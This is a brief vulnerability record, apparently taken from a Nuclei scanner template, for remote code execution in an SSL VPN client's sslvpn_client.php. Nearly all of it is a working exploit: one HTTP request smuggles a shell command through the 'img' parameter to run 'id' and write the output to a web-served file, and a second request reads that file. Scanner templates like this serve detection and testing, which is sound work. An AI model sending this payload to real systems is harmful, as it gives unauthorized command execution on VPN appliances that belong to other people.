# Vulnerability: SSL VPN Client - Remote Code Execution
**Classification:** SSLVPN
**Source:** Nuclei Template (`sslvpn-client-rce.yaml`)

## Description
SSL VPN Client is vulnerable to RCE.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /sslvpn/sslvpn_client.php?client=logoImg&img=%20/tmp|echo%20%60id%60%20|tee%20/usr/local/webui/sslvpn/{{filename}}.txt HTTP/1.1
Host: {{Hostname}}

GET /sslvpn/{{filename}}.txt HTTP/1.1
Host: {{Hostname}}
```

